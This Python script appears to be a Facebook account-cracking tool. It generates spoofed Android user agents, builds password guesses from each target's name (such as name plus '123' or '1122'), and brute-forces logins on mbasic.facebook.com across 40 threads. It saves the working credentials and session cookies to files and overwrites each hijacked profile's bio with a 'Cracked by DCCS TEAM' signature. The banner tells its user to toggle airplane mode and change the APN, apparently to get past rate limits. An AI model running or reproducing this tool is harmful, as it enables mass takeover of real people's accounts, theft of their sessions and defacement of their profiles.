import requests,re,random
import json
from concurrent.futures import ThreadPoolExecutor as xudi
import os,sys,uuid,time,string
from random import choice as uganda
from random import randrange as uganda2


guta = open
loop,cp,ok=0,[],[]
ugen=[]

for xd in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 7S'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/83.0.4103.101 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
    aa='Mozilla/5.0 (Linux; Android 7.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

logo = (""" Amar Sc Use Koro
 Shobar Gf Reh Amar Pokhho Theke
     I Love You & Ummah 🖤 From Mursalin 😘
 Amar Sc Use Koro
 Shobar Gf Reh Amar Pokhho Theke
     I Love You & Ummah 🖤 From Mursalin 😘
 Amar Sc Use Koro
 Shobar Gf Reh Amar Pokhho Theke
     I Love You & Ummah 🖤 From Mursalin 😘
 Amar Sc Use Koro
 Shobar Gf Reh Amar Pokhho Theke
     I Love You & Ummah 🖤 From Mursalin 😘
 Amar Sc Use Koro
 Shobar Gf Reh Amar Pokhho Theke
     I Love You & Ummah 🖤 From Mursalin 😘 """)


#Clr The Screen 

def clear():
	os.system('clear')
	print(logo)



#hudai ei bal da 
def lines():
	print(50*'_')
	
# main menu 
def Menu():
	clear()
	print(" [01] FILE CLONER")
	print(" [02] CONTACT DEVELOPER")
	print(" [00] EXIT ")
	lines()
	
	MAKGANG =input(" [?] Choose : ")
	if MAKGANG in ["1", "01"]:
		file()
	if MAKGANG in ["2","02"]:
	   os.system('xdg-open https://chat.whatsapp.com/DoCBFebR32GFFMl05gEXVk ')
	if MAKGANG in ["0","00"]:
	   exit('		THANKS YOU FOR USING ')
	else:
	       exit(' 	WRONG INPUT!  TRY AGAIN ')
	


#Call File
def file():
	clear()
	file= input(' [$] File Location \033[1;37m: ')
	try:
		oi = guta(file,'r').read().splitlines()
	except FileNotFoundError:
		exit(' File location not found ')
	lines()
	count = str(len(oi))
	clear()
	print ("Total Ids = "+count)
	print("\033[1;31m\rUSE FLIGHT (airplane) MODE BEFORE USE\033[1;32m")
	print("\033[1;31mChange Apn In Every 10min ")
	print('\033[1;32mCRACKING STARTED.....')
	lines()
	with xudi(max_workers=40) as fuck:
		for user in oi:
			idf,name = user.split('|')[0],user.split('|')[1].lower() 
			pwv = []
			frs = name.split(' ')[0]
			if len(frs)<=2:
				pwv.append(name)
				try:
					lss = name.split(' ')[1].lower()
					if len(lss)<=3 or (lss) == 'khan' or (lss) == 'islam' or (lss) == 'akter' or (lss) == 'rahman' or (lss) == 'ahmed' or (lss) == 'jahan' or (lss) == 'ahmmed':
						pass
					else:
						pwv.append(lss+'123')
						pwv.append(lss+'1234')
						pwv.append('@@'+lss+'123')
						pwv.append('@@'+lss+'1122')
						pwv.append(lss+'@@@')
						pwv.append(lss+'1122')
						pwv.append(lss+'111')
						
						try:
							lsd = name.split(' ')[2]
							if len(lsd)<=3 or (lsd) == 'khan' or (lsd) == 'islam' or (lsd) == 'akter' or (lsd) == 'rahman' or (lsd) == 'ahmed' or (lsd) == 'jahan' or (lsd) == 'ahmmed':
								pass
							else:
								pwv.append(lsd+'123')
						except:
							pass
				except:
					pass
			else:
				pwv.append(name)
				pwv.append('@@'+frs+'123')
				pwv.append('@@'+frs+'123')
				pwv.append(frs+'123')
				pwv.append(frs+'1234')
				pwv.append(frs+'12345')
				pwv.append(frs+'123456')
				pwv.append(frs+'1122')
				pwv.append(frs+'@@@')
				pwv.append(frs+'111')
				pwv.append(frs+'2211')
				
				try:
					lss = name.split(' ')[1]
					if len(lss)<=3 or (lss) == 'khan' or (lss) == 'islam' or (lss) == 'akter' or (lss) == 'rahman' or (lss) == 'ahmed' or (lss) == 'jahan' or (lss) == 'ahmmed':
						pass
					else:
						pwv.append('@@'+lss+'123')
						pwv.append('@@'+lss+'1122')
						pwv.append(lss+'123')
						pwv.append(lss+'@@@')
						pwv.append(lss+'1122')
						pwv.append(lss+'222')
						pwv.append(lss+'1234')
						pwv.append(lss+'12345')
						pwv.append(lss+'@@@@')
						pwv.append(lss+'112')
						pwv.append(lss+'111')
						pwv.append(lss+'123456')
						try:
							lsd = name.split(' ')[2]
							if len(lsd)<=3 or (lsd) == 'khan' or (lsd) == 'islam' or (lsd) == 'akter' or (lsd) == 'rahman' or (lsd) == 'ahmed' or (lsd) == 'jahan' or (lsd) == 'ahmmed':
								pass
							else:
								pwv.append(lsd+'123')
								pwv.append(lsd+'1122')
								pwv.append(lsd+'1234')
								pwv.append(lsd+'12345')
						except:
							pass
				except:
					pass
			fuck.submit(ummah,idf,pwv)
	print("")
	lines()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
	lines()
	input(' Press enter to back ')
	
def ummah(idf,pwv):
	global loop,cp,ok
	sys.stdout.write('\r\033[1;37m [DCCS] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(ok)));sys.stdout.flush()
	ua = uganda(ugen)
	ua2 = uganda(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			#print(ses.cookies.get_dict().keys())
			if "c_user" in ses.cookies.get_dict().keys():
				print (' \x1b[1;92m[DCCS-OK] '+idf+'|'+pw)
				guta('/sdcard/FILE-OK.txt', 'a').write( idf+' | '+pw+'\n')
				ok.append(idf)
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':"Cracked by DCCS TEAM (S = 'SAIMUN-CYBER-403')"}
					response = ses.post('https://m.facebook.com/profile/intro/bio/save/', cookies=cookies,data=data)
				except:pass
				
				cokii=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				guta('/sdcard/F-COOKIES.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print (f' [\x1b[1;91mDCCS-CP] '+idf+' | '+pw)
				guta('/sdcard/FILE-CP.txt', 'a').write( idf+' | '+pw+'\n')
				break
				
			else:
				#print (idf,pw)
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
	


Menu()